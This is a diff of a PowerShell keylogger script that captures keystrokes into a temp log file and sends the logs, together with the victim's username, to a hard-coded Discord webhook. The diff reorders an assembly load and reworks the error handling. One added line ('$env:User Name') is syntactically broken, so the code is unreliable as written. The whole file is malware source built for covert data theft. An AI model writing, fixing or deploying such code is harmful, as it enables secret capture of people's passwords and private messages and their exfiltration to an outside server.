@@ -7,6 +7,9 @@ $webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40m
 # Write the current process ID to a file
 $PID > "$env:TEMP\keylogger_pid.txt"
 
+# Load necessary assemblies for key logging
+Add-Type -AssemblyName System.Windows.Forms
+
 # Keylogger function
 function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
     # Create the log file if it doesn't exist
@@ -46,14 +49,16 @@ function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
     }
     catch {
         # Log any errors for debugging
-        Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error in KeyLogger: $_"
+        $errorMessage = "Error in KeyLogger: $_"
+        Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage
+        Write-Host $errorMessage
     }
     finally {
         # Send logs via webhook
         try {
             $logs = Get-Content "$logFile" | Out-String
             $Body = @{
-                'username' = $env:UserName
+                'username' = $env:User Name
                 'content' = $logs
             }
 
@@ -65,14 +70,12 @@ function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
             Write-Host "Logs sent successfully: $response"
         } catch {
             # Log any errors when sending the logs
-            Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error sending logs: $_"
-            Write-Host "Failed to send logs: $_"
+            $errorMessage = "Error sending logs: $_"
+            Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage
+            Write-Host $errorMessage
         }
     }
 }
-
-# Load necessary assemblies for key logging
-Add-Type -AssemblyName System.Windows.Forms
 
 # Run the keylogger
 KeyLogger
